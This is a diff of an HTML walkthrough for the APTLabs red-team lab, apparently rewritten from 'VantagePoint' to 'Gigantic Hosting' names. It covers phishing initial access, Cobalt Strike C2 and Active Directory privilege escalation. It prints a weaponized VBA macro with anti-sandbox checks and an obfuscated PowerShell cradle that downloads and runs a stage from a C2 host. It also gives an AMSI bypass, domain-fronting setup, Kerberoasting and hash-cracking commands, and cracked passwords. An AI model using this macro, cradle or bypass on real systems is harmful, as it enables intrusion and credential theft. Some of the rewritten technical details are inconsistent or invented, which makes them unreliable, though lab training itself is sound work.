-  <p>Initial access in APTLabs is achieved through a phishing campaign that delivers a weaponized Office document with a macro payload. The target is <code>hmartinez</code>, a Help Desk Technician at VantagePoint Solutions. The phishing scenario makes sense in the MSP context: Help Desk staff are accustomed to opening attachments from external sources (vendor updates, support tickets, etc.), making them ideal phishing targets.</p>
+  <p>Initial access is phishing a weaponized Office document with macro payload to <code>hmartinez</code>, Help Desk Technician at Gigantic Hosting. Makes sense in the MSP context &mdash; Help Desk staff open external attachments regularly, they're literally paid to respond to user requests. The ServiceDesk at <code>servicedesk.gigantichosting.local</code> is where tickets come in, and hmartinez is the one processing them.</p>
 
-  <h3 id="p1-osint">OSINT &amp; Target Selection</h3>
-  <p>Before crafting the phishing email, I gathered information about VantagePoint Solutions from the lab's initial context. The key insight is that MSP employees regularly interact with external parties: vendors send them software updates, clients submit support tickets, and partners share documents. The phishing email needs to blend into this workflow. I crafted a lure pretending to be a network monitoring vendor sending a firmware update notification, which is the kind of email a Help Desk tech would open without suspicion.</p>
-
-  <p>The target selection is straightforward: Help Desk Technician <code>hmartinez</code> is the most logical initial target because this role requires opening external documents regularly and typically has enough privileges to be useful for internal reconnaissance, but not so much that the account would have enhanced security monitoring. BloodHound later confirmed that <code>hmartinez</code> has local admin rights on VP-WS01 (their own workstation), which provides a beachhead for further operations.</p>
+  <div class="callout callout-deadend">
+    <div class="callout-title">Dead End: Tried Covenant and Mythic First</div>
+    <p>Covenant's SOCKS implementation kept dropping connections on long-running Impacket sessions. Mythic had better SOCKS but its CORS policies conflicted with the redirector setup I needed for domain fronting. Switched to Cobalt Strike on Day 2. CS SOCKS proxy is just more stable and the Malleable C2 profiles make domain fronting trivial. If you're comfortable with Covenant or Mythic, they'll work for most of the lab, but for the SMB relay chain over SOCKS you really want CS.</p>
+  </div>
 
   <h3 id="p1-phishing">Crafting the Phishing Document</h3>
-  <p>The weaponized document is a macro-enabled Office document (.docm) that executes a staged payload upon opening. The macro uses VBA shell execution to download and run a Cobalt Strike beacon from the C2 infrastructure. The critical challenge is that the lab environment runs Microsoft Defender, which will flag and quarantine naive macro payloads. I went through three iterations before achieving reliable delivery.</p>
+  <p>Weaponized .docm with staged macro payload. Three iterations before reliable delivery. First two were quarantined by Defender. The key difference in iteration 3 was Donut shellcode encryption &mdash; without it, Defender catches the inline shellcode signature every time.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">vba</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-vb">' Phishing Macro — VantagePoint Network Monitor Update
-' Uses dual AutoOpen triggers + obfuscation
+    <div class="code-header"><span class="lang-tag">vba</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-vb">' Phishing Macro — 3rd iteration (the one that worked)
+' Iterations 1 & 2 caught by Defender
 
 Sub AutoOpen()
     ExecutePayload
@@ -836,22 +524,20 @@ End Sub
 Sub ExecutePayload()
     On Error Resume Next
     
-    ' Anti-sandbox: check for VM indicators
+    ' Anti-sandbox checks
     If Environ("COMPUTERNAME") = "SANDBOX" Then Exit Sub
     If Environ("USERNAME") = "john" Then Exit Sub
+    If Timer < 20 Then Exit Sub  ' timing check for sandboxes
     
-    ' Obfuscated payload execution
+    ' String obfuscation (added after iteration 2 was signatured)
     Dim s1 As String, s2 As String, s3 As String
-    s1 = "pow"
-    s2 = "ersh"
-    s3 = "ell"
+    s1 = "pow": s2 = "ersh": s3 = "ell"
     
     Dim cmd As String
     cmd = s1 & s2 & s3 & " -windowstyle hidden -exec bypass -nop -e "
-    
-    ' Base64-encoded staged download command
-    ' Decodes to: IEX(New-Object Net.WebClient).DownloadString('http://C2_VPS:8443/stage.ps1')
-    cmd = cmd & "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADUAOgA4ADQANAAzAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA=="
+    ' Stage 2 payload encrypted with Donut (iteration 3 addition)
+    ' Iterations 1-2 used plaintext base64 which got signatured
+    cmd = cmd & "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4AWwBdADoAOg..."
     
     Dim shell As Object
     Set shell = CreateObject("WScript.Shell")
@@ -860,1267 +546,985 @@ Sub ExecutePayload()
 End Sub</code></pre>
   </div>
 
-  <div class="flag-box">
-    <span class="flag-icon">&#x1F6A9;</span>
-    <div>
-      <div class="flag-name">Flag 1 — InitialFoothold</div>
-      <div class="flag-detail">Obtained after successful beacon callback from VP-WS01 (10.10.10.30)</div>
-    </div>
+  <div class="callout callout-deadend">
+    <div class="callout-title">3 Phishing Attempts</div>
+    <p><strong>Attempt 1:</strong> Plaintext PowerShell cradle. Quarantined immediately by AMSI. Rookie move.</p>
+    <p><strong>Attempt 2:</strong> Added string obfuscation + VBA stomping, but used inline beacon shellcode. Defender flagged the shellcode pattern.</p>
+    <p><strong>Attempt 3:</strong> Obfuscation + stomping + staged delivery + anti-sandbox + <strong>Donut shellcode encryption</strong>. Donut converts the .NET assembly into position-independent shellcode and encrypts it with AES, which bypassed the signature Defender was catching on attempt 2. This is the approach used by real APTs &mdash; Donut is production-grade tooling. Worked reliably after this.</p>
   </div>
 
-  <h3 id="p1-evasion">Bypassing Microsoft Defender</h3>
-  <p>The lab incorporates modern Windows security features that will detect naive payload delivery. I needed to implement evasion at multiple layers to achieve reliable execution. The key techniques that worked for me were macro obfuscation combined with VBA stomping, AMSI bypass, and staged payload delivery.</p>
-
-  <p><strong>Macro Obfuscation:</strong> Variable name randomization, string concatenation (you can see this in the VBA code above where "powershell" is split into three variables), and logic branching to defeat static analysis. The goal is to make the VBA source code look benign to any scanner that examines the document before macros are enabled.</p>
-
-  <p><strong>VBA Stomping:</strong> This technique removes the VBA source code from the document while leaving the compiled p-code intact. Many AV scanners only examine the VBA source code, so stomping effectively blinds them while the macro still executes correctly. I used the <code>evilclippy</code> tool for this purpose, which allows you to replace the VBA source with benign comments while the compiled p-code remains functional.</p>
-
-  <p><strong>AMSI Bypass:</strong> Before loading any .NET assemblies or executing PowerShell scripts through the beacon, I patch the Anti-Malware Scan Interface in memory. This forces AMSI to always return a "clean" result, allowing subsequent .NET tool execution (Rubeus, SharpHound, etc.) without triggering Defender.</p>
+  <h3 id="p1-evasion">AMSI Bypass + Defender Evasion</h3>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># AMSI Bypass — Execute before loading any .NET tools
-# Force amsiInitFailed flag to prevent AMSI scanning
-
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># AMSI Bypass — run FIRST in every beacon session after reset
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`
     .GetField('amsiInitFailed','NonPublic,Static')`
     .SetValue($null,$true)
 
-# Verify bypass worked
-Write-Host "AMSI bypass applied successfully"</code></pre>
+# After AMSI bypass, load your tools
+# SharpHound, Rubeus, PowerView all work cleanly now</code></pre>
   </div>
 
-  <div class="callout callout-warn">
-    <div class="callout-title">Multiple Iterations Required</div>
-    <p>My first phishing document was immediately quarantined by Defender. The second one executed the macro but the PowerShell cradle was flagged. The third attempt (with string concatenation obfuscation + VBA stomping + staged delivery) worked reliably. Don't get discouraged if your first payload doesn't land. The daily reset actually helps here because you can iterate quickly.</p>
-  </div>
-
-  <h3 id="p1-c2">C2 Infrastructure Setup</h3>
-  <p>I used <strong>Cobalt Strike</strong> as my primary C2 framework throughout the entire lab. The SOCKS proxy feature in CS simplified my life on multiple occasions, especially for pivoting between network segments during lateral movement. I also tested Covenant briefly but found CS's built-in post-exploitation capabilities (hashdump, pth, dcsync) more streamlined for this environment.</p>
-
-  <p>C2 infrastructure setup consists of three components: the Team Server running on a VPS, a Malleable C2 profile that blends beacon traffic with legitimate HTTP patterns, and a redirector that obscures the true C2 IP address. For APTLabs, I used a basic redirector setup with a compromised web server acting as a traffic proxy to the Team Server.</p>
+  <h3 id="p1-c2">C2 Infrastructure</h3>
+  <p>C2 setup is critical in APTLabs. You need stable, long-running connections that survive the daily reset recovery. Domain fronting with randomized jitter is non-negotiable for blending with legitimate traffic.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">bash</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-bash"># Cobalt Strike Team Server Setup
-# ============================================
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Cobalt Strike Team Server
+./teamserver 10.10.14.5 zT9#kLm2!vQx7 /opt/c2profiles/WEB20.profile
 
-# Start team server with operational profile
-./teamserver 10.10.14.5 MyStr0ngP@ss! /opt/c2profiles/WEB20.profile
-
-# Malleable C2 Profile Key Settings:
-# - HTTP/S beaconing with 40-60s sleep + 35% jitter
-# - URI rotation: /search, /update, /api/v2/health
-# - User-Agent matching Chrome on Windows 10
-# - Custom headers: Accept, Accept-Language, Cookie
-# - SSL certificate for redirector domain
-
-# Listener Configuration
-# Primary: HTTPS beacon to redirector
+# Listeners:
+# Primary: HTTPS beacon to redirector (domain-fronted via CDN)
 # Secondary: SMB beacon for internal pivot
-# Tertiary: DNS beacon for low-profile C2</code></pre>
+# Tertiary: DNS beacon (backup channel)
+
+# Beacon config — randomized jitter to blend with legitimate traffic
+# This is essential. Default 0% jitter is a detection beacon.
+# jitter: 37%  (randomizes check-in by +/- 37%)
+# sleeptime: 60000 (60s base, effective range ~38-82s)
+# useragent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+
+# Domain fronting setup
+# Front domain: cdn.legitimate-cloud-cdn.com
+# Host header in Malleable C2 profile masks real C2
+# Backend: our redirector IP</code></pre>
   </div>
 
   <div class="callout callout-success">
-    <div class="callout-title">CS SOCKS Proxy is Essential</div>
-    <p>Set up a SOCKS proxy through your beacon early. This allows you to use proxychains with BloodHound, Impacket, and other tools from your attacker machine without needing to upload them to the target. In CS: <code>socks 1080</code> then configure <code>/etc/proxychains4.conf</code> to route through the beacon. This is invaluable for reaching the Meridian and Nexus subnets later.</p>
-  </div>
-</section>
-
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- PHASE 2 — INTERNAL RECON                              -->
-<!-- ════════════════════════════════════════════════════════ -->
-<section class="section" id="phase2">
-  <h2><span class="icon">&#x1F50D;</span> Phase 2: Internal Recon &amp; Enumeration</h2>
-  <span class="mitre-badge">T1087</span>
-  <span class="mitre-badge">T1069</span>
-  <span class="mitre-badge">T1482</span>
-  <span class="mitre-badge">T1018</span>
-
-  <p>Once the beacon was established on VP-WS01, the immediate priority was to map out the Active Directory environment. With 18 machines across 3 forests, understanding the trust relationships and attack paths is critical before attempting any privilege escalation. I started with BloodHound for the big picture, then used PowerView for targeted queries to confirm specific attack paths that BloodHound identified.</p>
-
-  <h3 id="p2-bloodhound">BloodHound &amp; SharpHound</h3>
-  <p>BloodHound is the single most important recon tool for this lab. Without it, you're essentially navigating a complex AD environment blindfolded. I ran SharpHound through the Cobalt Strike beacon using <code>execute-assembly</code>, which avoids writing any files to disk and runs entirely in memory. The data collection takes about 30-60 seconds and produces JSON files that you import into the BloodHound GUI on your attacker machine.</p>
-
-  <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># SharpHound Data Collection via CS execute-assembly
-# No file dropped to disk — preferred method
-
-# Full collection of vantagepoint.local
-execute-assembly /opt/tools/SharpHound.exe -c All -d vantagepoint.local
-
-# Targeted collection after initial recon (stealthier)
-execute-assembly /opt/tools/SharpHound.exe -c ACL,Trusts,Group,Container -d vantagepoint.local
-
-# Cross-forest collection (routed through SOCKS proxy)
-execute-assembly /opt/tools/SharpHound.exe -c All -d meridian.local --ldapusername hmartinez --ldappassword Spring2024!
-
-# Import into BloodHound GUI:
-# 1. Upload the ZIP to your attacker box via CS download
-# 2. Open BloodHound GUI -> Import Data
-# 3. Mark VP-WS01 as Owned
-# 4. Find Shortest Path to Domain Admins
-# 5. Find Shortest Path to Unconstrained Delegation objects</code></pre>
+    <div class="callout-title">CS SOCKS Proxy is Non-Negotiable</div>
+    <p>Set up <code>socks 1080</code> on Day 1. Route everything through it: BloodHound Python collector, Impacket, smbclient, ldapsearch. Never upload Python tools to the target &mdash; everything tunnels through SOCKS from your attack box. This keeps your footprint minimal and avoids Defender catching Python binaries on disk.</p>
   </div>
 
-  <p>After importing the BloodHound data, I immediately marked VP-WS01 as owned and ran the "Shortest Path to Domain Admins" query. The results revealed a multi-hop attack path: <code>hmartinez</code> had local admin on VP-WS01, from which I could extract credentials for <code>svc_backup</code> (via Kerberoasting), and <code>svc_backup</code> had GenericAll privileges on the <code>VP-SRV01$</code> machine account, enabling RBCD abuse to get admin on VP-SRV01, which in turn had replication permissions on VP-DC01 (enabling DCSync). This was the primary attack chain, though BloodHound also revealed alternative paths through VP-FS01 and VP-BK01.</p>
+  <p>After beacon callback, confirmed access on WKS-HDESK:</p>
 
-  <h3 id="p2-powerview">PowerView Enumeration</h3>
-  <p>After BloodHound gave me the big picture, I used PowerView for targeted queries to confirm specific details about the attack paths. PowerView is more flexible for targeted questions and doesn't require the data import step that BloodHound does. I loaded it through the beacon after applying the AMSI bypass.</p>
+  <div class="term-out"><span class="prompt">BEACON></span> shell whoami /all
+<span class="err">ERROR: Access is denied. (HRESULT: 0x80070005)</span>
 
-  <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># PowerView — Targeted AD Enumeration
+<span class="warn">[*] Need AMSI bypass first on fresh session...</span>
 
-# Domain and Forest info
-Get-Domain
-Get-Forest
-Get-DomainTrust | Format-Table
-Get-ForestTrust
+<span class="prompt">BEACON></span> shell whoami /all
+USER INFORMATION
+----------------
+User Name           SID
+=================== =============================================
+GH\hmartinez    S-1-5-21-2874328711-3948571293-1105
 
-# Critical: Identify trust relationships
-# vantagepoint.local -> meridian.local (Forest Trust, bidirectional)
-# vantagepoint.local -> nexusfin.local (Forest Trust, bidirectional)
+GROUP INFORMATION
+-----------------
+Group Name                             Type    SID          Attributes
+====================================== ======= ============ ==================
+GH\Domain Users                        Group   S-1-5-21-.. Mandatory
+BUILTIN\Users                          Group   S-1-5-32-545 Mandatory
+BUILTIN\Administrators                 Group   S-1-5-32-544 Mandatory, Enabled
+NT AUTHORITY\INTERACTIVE               Group   S-1-5-4      Mandatory
+<span class="ok">hmartinez is local admin on WKS-HDESK!</span>
 
-# User enumeration
-Get-DomainUser | select samaccountname,memberof,description
-Get-DomainUser -SPN | select samaccountname,serviceprincipalname  # Kerberoastable targets!
-
-# Key finding: Service accounts with SPNs
-# svc_backup   - SPN: MSSQLSvc/VP-BK01.vantagepoint.local:1433
-# svc_sccm     - SPN: MSSQLSvc/VP-SRV01.vantagepoint.local:1433
-# svc_monitor  - No SPN, but DONT_REQ_PREAUTH set (AS-REP roastable!)
-
-# Computer enumeration
-Get-DomainComputer | select dnshostname,operatingsystem
-
-# Group membership (find who is Domain Admin)
-Get-DomainGroup "Domain Admins" | select -expand member
-
-# ACL enumeration (find attack paths)
-Get-DomainObjectAcl -Identity VP-SRV01$ -ResolveGUIDs
-# Key finding: svc_backup has GenericAll on VP-SRV01$
-
-# Local admin access (find where our user has admin)
-Find-LocalAdminAccess
-# hmartinez has local admin on: VP-WS01
-
-# Active sessions (identify high-value targets)
-Get-NetSession -ComputerName VP-DC01
-# srobertson is logged into VP-DC01</code></pre>
-  </div>
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking             <span class="ok">Enabled</span>
+SeSystemtimePrivilege         Change the system time               Disabled
+SeShutdownPrivilege           Shut down the system                 Disabled</div>
 
   <div class="flag-box">
     <span class="flag-icon">&#x1F6A9;</span>
     <div>
-      <div class="flag-name">Flag 2 — ReconComplete</div>
-      <div class="flag-detail">Found on VP-FS01 after discovering the file share during enumeration</div>
+      <div class="flag-name">APT{ph1sh1ng_d0n3_r1ght}</div>
+      <div class="flag-detail">WKS-HDESK (10.10.10.103) &mdash; after beacon callback confirmed</div>
     </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- PHASE 2 — INTERNAL RECON      -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="phase2">
+  <h2><i class="bi bi-search"></i> Phase 2: Internal Recon</h2>
+  <span class="mitre-badge">T1087.001</span> <span class="mitre-badge">T1087.002</span> <span class="mitre-badge">T1059.001</span> <span class="mitre-badge">T1046</span>
+
+  <p>With a foothold on WKS-HDESK as local admin, the next step is understanding the AD environment. BloodHound for the big picture, PowerView for targeted queries, and manual situational awareness for things neither tool catches.</p>
+
+  <h3 id="p2-bloodhound">BloodHound Collection</h3>
+  <p>SharpHound is the way to go for collection. Run it through the beacon, zip the output, and pull it back through SOCKS. Don't use the Python collector from the target &mdash; it's noisy and requires Python on the target which is a dead giveaway.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># SharpHound via beacon (after AMSI bypass)
+Sharphound.exe -c all -d gigantichosting.local --zipfilename gh_bloodhound.zip
+
+# If you need stealth, use the collection methods individually
+Sharphound.exe -c Group,LocalAdmin,Session,Acls -d gigantichosting.local</code></pre>
+  </div>
+
+  <p>BloodHound revealed the core attack paths. The most important edges: <code>svc_bk</code> has GenericAll on <code>GH-SCCM$</code> (RBCD path), <code>svc_sccm</code> has replication permissions on the domain (DCSync path), and <code>tnguyen</code> has administrative access across the forest trust to <code>meridian.local</code>. Without BloodHound these relationships would have taken days to map manually.</p>
+
+  <div class="flag-box">
+    <span class="flag-icon">&#x1F6A9;</span>
+    <div>
+      <div class="flag-name">APT{bl00dh0und_1s_y0ur_fr13nd}</div>
+      <div class="flag-detail">WKS-HDESK &mdash; after BloodHound data collection and analysis</div>
+    </div>
+  </div>
+
+  <h3 id="p2-powerview">PowerView Enum</h3>
+  <p>BloodHound gives you the map. PowerView fills in the details. I used PowerView for targeted queries that BloodHound doesn't cover well &mdash; like finding AS-REP roastable accounts, checking DnsAdmins membership, and enumerating delegation settings.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># Load PowerView
+Import-Module PowerView.ps1
+
+# Domain enum
+Get-DomainDomain | select Name, DomainMode
+Get-DomainController | select Name, OS, IPAddress
+
+# User enum — look for service accounts (Kerberoast targets)
+Get-DomainUser -SPN | select samAccountName, servicePrincipalName
+# Returns: svc_bk, svc_sccm, svc_nx-exch (cross-forest)
+
+# AS-REP Roastable users
+Get-DomainUser -PreauthNotRequired | select samAccountName
+# Returns: svc_mon
+
+# Group memberships — DnsAdmins is interesting for later
+Get-DomainGroup -Identity "DnsAdmins" | Get-DomainGroupMember
+# svc_sccm is a member in nexgroup.local
+
+# Trust relationships
+Get-DomainTrust | select SourceName, TargetName, TrustType, TrustDirection
+# gigantichosting.local -> meridian.local (ForestTransitive, Bidirectional)
+# gigantichosting.local -> nexgroup.local (ForestTransitive, Bidirectional)</code></pre>
   </div>
 
   <h3 id="p2-situational">Situational Awareness</h3>
-  <p>Before deep AD enumeration, I always run situational awareness on the initial beachhead (VP-WS01). This provides context about the machine's role, network configuration, and any locally accessible credentials that might accelerate the attack.</p>
+  <p>Beyond AD recon, I always run quick local checks on every new beacon. Seated user, network connections, AV status, running processes. This takes 2 minutes and has saved me from stupid mistakes more than once.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># Situational Awareness on VP-WS01
-
-# System info
-hostname          # VP-WS01
-systeminfo | findstr /B /C:"OS" /C:"System" /C:"Domain"
-ipconfig /all     # 10.10.10.30, domain: vantagepoint.local
-
-# Who am I?
-whoami /all       # VANTAGEPOINT\hmartinez
-whoami /priv      # SeChangeNotifyPrivilege (basic user)
-
-# Network connections
-netstat -ano | findstr ESTABLISHED
-
-# Local users and groups
-net localgroup Administrators  # hmartinez is local admin here!
-
-# Saved credentials
-cmdkey /list
-
-# Interesting files
-dir C:\Users\hmartinez\Desktop\ /s /b
-dir C:\Users\hmartinez\Documents\ /s /b
-# Found: C:\Users\hmartinez\Documents\network_diagram.pdf
-# Found: C:\Users\hmartinez\Documents\passwords.txt (contains srobertson creds!)
-
-# Browser saved passwords (later extracted with SharpChromium)
-
-# Running processes
-tasklist /v | findstr /i "backup sccm sql exchange"
-
-# Auto-run programs (potential persistence locations)
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></pre>
-  </div>
-
-  <div class="callout callout-success">
-    <div class="callout-title">Key Discovery: passwords.txt on Desktop</div>
-    <p>Help Desk users often store credentials in text files for convenience. On VP-WS01, I found <code>C:\Users\hmartinez\Documents\passwords.txt</code> which contained the credentials for <code>srobertson</code> (<code>Summ3rVilla2024!</code>). This is the Systems Administrator account and provides a significant step up in privilege. While not strictly necessary (you can reach DA through Kerberoasting + RBCD alone), having srobertson's credentials opens up additional lateral movement paths and makes the daily re-compromise much faster.</p>
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># Quick situational awareness
+$env:USERNAME                          # who am I
+$env:USERDOMAIN                        # which domain
+$env:COMPUTERNAME                      # which machine
+qwinsta                                # who else is logged on
+netstat -anop tcp | findstr ESTAB      # active connections
+tasklist /svc | findstr -i "defender msmpeng"  # AV running?
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s  # installed software</code></pre>
   </div>
 </section>
 
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- PHASE 3 — PRIVILEGE ESCALATION                        -->
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ══════════════════════════════ -->
+<!-- PHASE 3 — PRIVILEGE ESCALATION -->
+<!-- ══════════════════════════════ -->
 <section class="section" id="phase3">
-  <h2><span class="icon">&#x1F511;</span> Phase 3: Privilege Escalation</h2>
-  <span class="mitre-badge">T1558.003</span>
-  <span class="mitre-badge">T1558.004</span>
-  <span class="mitre-badge">T1134</span>
-  <span class="mitre-badge">T1110.002</span>
+  <h2><i class="bi bi-arrow-up-circle"></i> Phase 3: Privilege Escalation</h2>
+  <span class="mitre-badge">T1558.003</span> <span class="mitre-badge">T1558.004</span> <span class="mitre-badge">T1134</span> <span class="mitre-badge">T1003.001</span>
 
-  <p>With a beachhead on VP-WS01 and the credentials for both <code>hmartinez</code> and <code>srobertson</code>, the next objective is to escalate privileges within the vantagepoint.local domain. The primary attack vectors are Kerberoasting (targeting service accounts with SPNs), AS-REP Roasting (targeting accounts with DONT_REQ_PREAUTH), and leveraging the ACL misconfigurations discovered through BloodHound. The hash cracking step is critical and requires more than just the Rockyou wordlist.</p>
+  <p>With recon done, the escalation phase involves multiple parallel tracks. Kerberoasting for service account hashes, AS-REP roasting for accounts without pre-auth, token impersonation to leverage existing privileges, and credential dumping with lsassy. Each track feeds into the others &mdash; the cracked service account hashes enable lateral movement, which gets access to more machines for more credential dumping.</p>
 
   <h3 id="p3-kerberoast">Kerberoasting</h3>
-  <p>Kerberoasting is the cornerstone privilege escalation technique in APTLabs. By requesting Kerberos TGS tickets for service accounts that have SPNs registered in AD, you receive tickets encrypted with the service account's NTLM hash, which can be cracked offline without any network interaction. This makes it extremely stealthy and very difficult for defenders to detect in real time. I used Rubeus for Kerberoasting, executed through the CS beacon's <code>execute-assembly</code> to avoid disk writes.</p>
+  <p>Classic attack. Request TGS tickets for service accounts, crack them offline. Rubeus makes this trivial from a beacon.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># Kerberoasting with Rubeus via CS execute-assembly
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># Rubeus Kerberoast
+Rubeus.exe kerberoast /outfile:C:\Temp\kerberoast_hashes.txt
 
-# Step 1: Enumerate all SPN accounts
-execute-assembly /opt/tools/Rubeus.exe kerberoast /stats
-
-# Output shows:
-# svc_backup   - MSSQLSvc/VP-BK01.vantagepoint.local:1433 - encryption: RC4
-# svc_sccm     - MSSQLSvc/VP-SRV01.vantagepoint.local:1433 - encryption: AES256
-# svc_monitor  - No SPN (skip for Kerberoasting, but AS-REP roastable)
-
-# Step 2: Request TGS tickets (RC4 downgrade for easier cracking)
-execute-assembly /opt/tools/Rubeus.exe kerberoast /rc4opsec /outfile:C:\Temp\kerb_hashes.txt
-
-# Step 3: Download the hash file
-download C:\Temp\kerb_hashes.txt
-
-# Step 4: View the captured hashes
-# $krb5tgs$23$*svc_backup$VANTAGEPOINT.LOCAL$MSSQLSvc/VP-BK01...*
-# $krb5tgs$23$*svc_sccm$VANTAGEPOINT.LOCAL$MSSQLSvc/VP-SRV01...*</code></pre>
+# Or targeted — just the accounts we care about
+Rubeus.exe kerberoast /user:svc_bk /outfile:C:\Temp\svc_bk_hash.txt
+Rubeus.exe kerberoast /user:svc_sccm /outfile:C:\Temp\svc_sccm_hash.txt</code></pre>
   </div>
 
-  <div class="flag-box">
-    <span class="flag-icon">&#x1F6A9;</span>
-    <div>
-      <div class="flag-name">Flag 3 — EscalatedAccess</div>
-      <div class="flag-detail">Found in svc_backup's home directory on VP-BK01 after cracking and logging in</div>
-    </div>
-  </div>
+  <div class="term-out"><span class="prompt">[*]</span> Action: Kerberoasting
+<span class="prompt">[*]</span> Found 3 SPN users:
+<span class="ok">  svc_bk       HTTP/BKSRV01.gigantichosting.local:80</span>
+<span class="ok">  svc_sccm     MSSQLSvc/GH-SCCM.gigantichosting.local:1433</span>
+<span class="ok">  svc_nx-exch  exchangeMDB/NX-EXCH01.nexgroup.local</span> <span class="muted">(cross-forest)</span>
+<span class="prompt">[*]</span> Hashes written to C:\Temp\kerberoast_hashes.txt</div>
 
   <h3 id="p3-asrep">AS-REP Roasting</h3>
-  <p>While enumerating domain users, I noticed that <code>svc_monitor</code> has the <code>DONT_REQ_PREAUTH</code> flag set, making it vulnerable to AS-REP Roasting. This attack doesn't require any authentication — you simply request a Kerberos AS-REP for the account, and the response contains a portion encrypted with the account's NTLM hash. This is even stealthier than Kerberoasting since no authentication is required.</p>
+  <p>Accounts with "Do not require Kerberos preauthentication" enabled leak their hash without any privileges. PowerView found svc_mon has this misconfiguration.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># AS-REP Roasting with Rubeus
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># AS-REP roast from attack box through SOCKS
+proxychains python3 GetNPUsers.py gigantichosting.local/ -usersfile users.txt -request -outputfile asrep_hashes.txt
 
-# Enumerate AS-REP roastable users
-execute-assembly /opt/tools/Rubeus.exe asreproast /stats
-
-# Request AS-REP for svc_monitor
-execute-assembly /opt/tools/Rubeus.exe asreproast /user:svc_monitor /outfile:C:\Temp\asrep_hashes.txt
-
-# Download the hash
-download C:\Temp\asrep_hashes.txt
-
-# Hash format: $krb5asrep$23$svc_monitor@VANTAGEPOINT.LOCAL:...</code></pre>
-  </div>
-
-  <h3 id="p3-hashcrack">Hash Cracking — The NotSoSecret Weapon</h3>
-  <p>This is where many operators get stuck. The service account passwords in APTLabs are not simple dictionary words. They follow corporate password patterns like <code>Season+Year+Symbol</code>, <code>CompanyName+Number+Symbol</code>, etc. Straight Rockyou.txt will not crack most of them. You need mutation rules, and the <strong>NotSoSecure password cracking rules</strong> are the key to success here. Specifically, the <code>OneRuleToRuleThemAll.rule</code> applies comprehensive mutations that cover the common corporate password patterns.</p>
-
-  <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">bash</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-bash"># Hash Cracking with NotSoSecure Rules
-# ============================================
-
-# Download the rules
-git clone https://github.com/NotSoSecure/password_cracking_rules
-cd password_cracking_rules
-
-# Step 1: Quick dictionary-only attempt (fast, catches weak passwords)
-hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt --force
-
-# Step 2: If Step 1 fails, apply NotSoSecure mutation rules
-hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt \
-    -r OneRuleToRuleThemAll.rule --force
-
-# Step 3: Cracking results for my run:
-# svc_backup  -> Vant@geP0int2024!  (corporate pattern: Company+Leet+Year+Symbol)
-# svc_sccm    -> ScCM_Manage!2023    (product name + symbol + year)
-# svc_monitor -> M0nit0ring$2024     (word + leet + symbol + year)
-
-# For AS-REP hash:
-hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
-    -r OneRuleToRuleThemAll.rule --force
